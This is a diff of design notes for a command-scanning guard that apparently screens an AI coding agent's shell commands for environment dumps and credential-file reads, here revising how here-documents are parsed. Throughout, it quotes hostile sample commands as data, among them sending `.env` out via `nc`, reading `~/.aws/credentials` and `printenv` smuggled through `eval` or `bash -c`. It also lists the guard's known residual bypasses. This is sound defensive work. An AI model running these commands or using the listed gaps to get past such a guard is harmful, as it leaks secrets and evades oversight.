@@ -995,42 +995,46 @@ shell, not a shell: what it does not read is listed at the end of this subsectio
   (`< .env nc example.invalid 80` is a `dotenv_read`), and `cat < ~/.aws/credentials` keeps its verdict.
   A backquote inside a single-quoted string is text for the shell that string is handed to, so
   `bash -c 'echo "`printenv`"'` and `eval '...'` read it (the tokenizer used to turn every backquote into `;`).
-- **Here-documents inside such a substitution.** One with a quoted delimiter (`<<'EOF'`, `<<"EOF"`, `<<\EOF`, also
-  partly quoted such as `<<'E'OF`) holds data, so, where the command that receives the substitution takes data (the next
-  item), the body a scan returns loses it and
-  `git commit -m "$(cat <<'EOF' ... EOF)"` passes whatever its prose says: five real commit messages of this
-  repository, that mention `set`, `ps -E`, a `cat` of a credential file or a keyring name in prose and had made the
-  pattern fail, are ALLOWED rows in the tests. The tokenizer does not read that data either, once its substitution
-  closes: shlex's quote parity used to read prose as commands whenever a message held an odd number of `"`, so two commit
-  messages of this work (about `env` and `printenv`), which the earlier guard refused in this pattern, now pass, and a
-  substitution that never closes is read as before. A shell that reads such a body as code
-  (`echo "$(bash <<'EOF' ... EOF)"`) is therefore not read, as before. An unquoted delimiter keeps its body, which the shell expands and the guard reads as
-  command lines, as it does for a top-level here-document, so prose in it that looks like a command (a line that starts
-  with `printenv`, or `(ps -E, ...)`) trips the guard, and a `$(...)` or backquote in it, which the shell runs, is read as a
-  substitution of its own (`cat <<EOF` followed by `value: "$(printenv)"` and `EOF` is an `environment_dump`, as is the
-  same body behind `"$(cat <<EOF ...)"`). How here-document bodies are read as commands stays as it was.
-- **A quoted here-document is data only for a command that takes data (2026-09-29).** Bash runs what a substitution
-  prints when the command that receives it is a shell with `-c`, `eval`, `source`, `xargs` or an interpreter, so
-  `eval "$(cat <<'EOF' ... printenv ... EOF)"` and `bash -c "$(cat <<'EOF' ... EOF)"` (also `sh`, `zsh`, and behind `env`,
-  `timeout`, `nohup`, `xargs`, `sudo`, `rtk proxy` or a keyring exec) dump the environment. The base guard refused them;
-  the first version of the rule above, which hid the body from every consumer, let them through. The body is now data
-  only when the command that receives the substitution as an argument, after the reserved words, assignments, wrappers and
-  launchers the guard models, is `git`, `gh`, `echo`, `printf`, `cat` or `tee`, so `git commit -m`, `gh pr create --body`
-  and `echo` keep passing. `cat` and `tee` count only for a here-string word (`cat <<< "$(...)"`), because a reader's
-  operand is a file name: `cat "$(cat <<'EOF' ... a credential path ... EOF)"` stays a `credential_file_read`. Every other
-  consumer (a shell, `eval`, an interpreter, `source` and `.`, `xargs`, `watch`, `ssh`, `curl`, `awk`, any program the guard
-  does not know), an assignment, the command position, a substitution nested in another, and any text the guard cannot
-  tell (the private-use characters U+E001 or U+E002 in it, more than 100,000 characters left after the comments, top-level
-  here-document bodies and substitutions are cut, keyring execs nested more than 16 deep) keep the stricter reading, so
-  prose in a quoted here-document inside them can still be refused (a bare `printenv` line in
-  `python3 tools/x.py --message "$(cat <<'EOF' ... EOF)"` is an `environment_dump`; put such text in a file with the Write
-  tool and pass the path). Measured that day against the base
-  guard (c26800f3): a matrix of 39 consumers, 18 launcher prefixes, 5 here-document forms, 8 payloads and 4 substitution
-  forms (112,320 commands) loosens no row for any consumer that is not on the list, where the first version loosened up
-  to 2,040 per consumer. Not read, as before: what an allowed consumer's output is used for afterwards (`echo "$(cat
-  <<'EOF' ... EOF)" | sh`, an echo written into a script that is then run, a git option that runs its value such as
-  `git -c core.pager=...`), and a shell that reads the quoted here-document itself inside the substitution
-  (`echo "$(bash <<'EOF' ... EOF)"`).
+- **Here-documents are not read as such; one strict idiom is exempt (2026-09-29).** A here-document's lines are command
+  lines like any other, as the tokenizer has always read them at the top level, so code or prose in a body is read as
+  commands, and a `"$(...)"` or a backquote pair in a body line is read as a substitution: `cat <<'EOF' > note.md` followed
+  by `value: "$(printenv)"` and `EOF` is an `environment_dump`, quoted delimiter or not. The guard read them specially for
+  a time (a quoted delimiter made the body data inside a double-quoted substitution, so
+  `git commit -m "$(cat <<'EOF' ... EOF)"` passed whatever its prose said), and the independent verification review of
+  that reading (172596ed, 2026-09-29) found that it needs bash-exact parsing of delimiters and terminators, and that each
+  slip erased executable text: an ANSI-C delimiter (`<<$'EOF'`), a backslash-newline that joined a body line to its
+  terminator, an arithmetic command such as `((1 << "2"))` and a quoted `#` made it take real commands for data, a shell
+  that reads the body (`echo "$(bash <<'EOF' ... EOF)"`) was not read, and `eval "$(cat <<'EOF' ... EOF)"` and
+  `bash -c "$(...)"` ran what the base guard refused. That reading, with its terminator tracking and delimiter decoding,
+  is gone. What replaced it is one exemption, a strict canonical idiom, looked for in the text as written (before the guard
+  joins backslash-newline pairs): a double-quoted word that is exactly `"$(`, blanks, `cat`, blanks, `<<` or `<<-`,
+  blanks, `'IDENT'` (single quotes; IDENT of letters, digits and `_`, not starting with a digit), nothing else but blanks
+  on that line, a newline, the body lines, the first line that is exactly IDENT (for `<<-` after its leading tabs; no other
+  trimming, no carriage return), then only blanks and newlines and `)"`, standing alone as a word (after a blank or at the
+  start, before a blank, the end or one of `;&|)<>`). Where the command that receives it, after the reserved words,
+  assignments, wrappers and launchers the guard models, is `git`, `gh`, `echo` or `printf` and the idiom is a word of its
+  own after that program, the command reading sees a neutral word in its place; the raw-text rules (store paths, secret
+  names and expansions, `/proc`) keep reading the whole text as they always did. Every other shape keeps the reading of its
+  body lines as commands: a `\EOF`, `"EOF"`, `$'EOF'` or an unquoted delimiter, another first command (`cat -n`, `tee`,
+  `/bin/cat`), text on the operator line (`| sh`), text after the terminator (if a body line equals IDENT, the first such
+  line is the terminator and only `)"` may follow it), an unterminated body, a word glued to what precedes or follows it
+  (`--body="$(...)"`), the same idiom behind any other program (a shell with `-c`, `eval`, an interpreter, `source`,
+  `xargs`, `watch`, `ssh`, `cat`, `tee`, an assignment, the command position) or inside another substitution's body, and a
+  text the guard cannot read (an unbalanced quote, for instance an apostrophe in an earlier here-document's prose; the
+  private-use characters U+E001 and U+E002): its words are a guess, and a guess is no reason to hide a body. The cost is
+  friction, in the strict direction: a body line that starts with `printenv` or `env`, or holds `$(printenv)`, is refused
+  outside the idiom, and an unquoted here-document in a substitution (`echo "$(cat <<EOF`, `printenv`, `EOF`) is an
+  `environment_dump` as it is at the top level. Write such text with the Write tool and pass the path (`git commit -F
+  FILE`). Residual gaps, each an inert string in `EXPECTED_PASS_THROUGH`: a git or gh option that runs its value
+  (`git rebase --exec "$(cat <<'EOF' ... EOF)"`, `gh alias set`), an echo whose output is piped into a shell or written
+  into a script that runs later, and an unquoted here-document that expands `$(...)` between single quotes
+  (`cat <<EOF` with `'$(printenv)'` in its body), which the base guard passed too. Measured 2026-09-29: of the 1,942 commit
+  messages of this repository, in the `git commit -m` and `gh pr create --body` patterns, the guard refuses 10 (each names
+  a secret variable or a store path in prose, which the raw-text rules read) and the base guard 13, and 4 messages that the
+  base guard refused (its quote parity read prose as commands) pass; a matrix of 39 consumers, 18 launcher prefixes, 5
+  here-document forms, 8 payloads and 4 substitution forms (112,320 commands) loosens no row against the base guard; and
+  mutation fuzz of 24,720 mutants of 412 blocked strings loosens 2 or 3 per seed, each a mutant whose broken terminator
+  leaves a real quoted body that bash prints and does not run.
 - **A `#` comment hides only its own line, and only where a word starts.** The tokenizer joins the lines of a command
   with `;` and shlex reads a `#` anywhere, `$#` and `a#b` included, as the start of a comment, so a `#` dropped the whole
   rest of the command: `# macOS` followed by `ps -E`, `echo ${#PATH}; printenv` and
@@ -1040,13 +1044,18 @@ shell, not a shell: what it does not read is listed at the end of this subsectio
   so nothing it read before is dropped (up to 200,000 characters: tokenizing costs about 9 microseconds a character inside
   quotes, and two readings of an 840 KB message took 17.8 s against a 10 s hook timeout, one reading 8.9 s). Inside a
   `$(...)` body a comment also runs to the end of its line (`echo "$(date # )` newline `printenv` newline `)"` runs
-  printenv). In a here-document body, whose lines the guard reads as commands, a comment hides the rest of that body, as
-  before, so a script written through a here-document (its first line is `#!`) stays as unread as it was; the text after
-  the terminator is read. What this newly blocks, measured on this repository: no fenced block, no fenced line and no
-  script written through a here-document, and only when a whole script is passed as one command string the array
-  literals `x=(env -i ...)` and a python `set(...)`, which the guard has always read as commands.
+  printenv). In a here-document body a comment likewise hides only its own line: the lines of a script written through a
+  here-document are read as commands, which the `#!` line of the script hid for a time. What this newly blocks, measured on
+  this repository (2026-09-29): 4 of its 201 shell scripts when written through a here-document (their array literals
+  `X=(env HOME=...)`, which the guard reads as an `env` with no command), one of 785 fenced blocks (a python
+  `len(set(found))`) and none of 4,338 fenced lines; the same array literals and python `set(...)` were always read as
+  commands when a whole script is passed as one command string.
 - **ANSI-C strings are data.** `$'...'` runs to the first `'` that a backslash does not escape, so
   `printf '%s' $'it\'s "$("printenv")"'` holds no substitution and passes; inside double quotes `$'` is no such string.
+  shlex knows no ANSI-C quoting (it read `$'it\'s #\nprintenv\n'` as a word, a quote that opens and a comment, and the
+  harmless text was refused), so the tokenizer keeps each such string as one word of the same text, its `\'` written as a
+  quote shlex reads: `printf '%s' $'it\'s #\nprintenv\n'` passes and `bash -c $'printenv'` is read as `bash -c printenv`.
+  Escapes such as `\n` and `\x..` are not decoded.
 - **Arithmetic expansion is no command.** `$((` opens an arithmetic expansion only when a `))` that touches closes it:
   `env=2; echo "$((env))"` reads the variable `env` and a `<<` in it is a shift, so both pass, while a real substitution
   inside it (`$(( $(printenv | wc -l) + 1 ))`) is still read and `$((printenv) )`, whose parentheses do not touch, is a
@@ -1079,10 +1088,10 @@ shell, not a shell: what it does not read is listed at the end of this subsectio
   `command`, `http`, or `mcp_tool` hook doesn't block the tool call"), and the guard's hook timeout is 10 s, so the time
   the rules take is part of the guard's safety and no timer inside the hook can replace it. That is why each text is
   scanned in one pass (a stack of frames and a regular expression that jumps between the characters that matter, not
-  a rescan per here-document, per arithmetic shift or per nesting level), a here-document's terminator is found by a
-  binary search in a line index built once, a chain of `env`, `rtk` or `systemd-run` launchers is walked by index instead
+  a rescan per arithmetic shift or per nesting level), the terminator of the canonical idiom is found by a binary search
+  in a line index built once and the text after it is matched once per terminator, a chain of `env`, `rtk` or `systemd-run` launchers is walked by index instead
   of copying the rest of the command at every hop, and the bodies read behind double-quoted substitutions are capped at
-  32 levels and at four times the command's length plus 64 KiB. Measured on this host with the nine inputs of
+  32 levels and at four times the command's length plus 64 KiB. Measured on this host with the inputs of
   `PATHOLOGICAL` in `tests/test_secret_path_guard.py`: the first version of the substitution scan took 10 s on 12,000
   here-documents and on 12,000 lines of `$((1 << 2))`, and ran past a minute on 60,000 nested `systemd-run`; the launcher
   walk that predates this work took 29 s on 20,000 nested `env` and 56 s on 20,000 nested `rtk proxy`. Each input now
@@ -1113,7 +1122,7 @@ and `busctl --user get-property org.freedesktop.systemd1 /org/freedesktop/system
 Environment`, and a substitution nested beyond 32 levels or past the work budget (shlex's quote parity happens to expose
 the innermost command of `"$(echo "$(...)")"` one level down, so the tests count the texts read instead). The other
 way, the guard reads as commands what is not one: an array literal `x=(env -i A=b)`, a python `set(...)` in a script
-body and prose in a here-document that looks like a command (the old reading of here-documents, unchanged), and an `E`
+body and prose in a here-document that looks like a command (its lines are command lines, above), and an `E`
 after `ps -C` that is a command name (`ps -CEmacs`).
 
 ## Threat model and what each guard stops
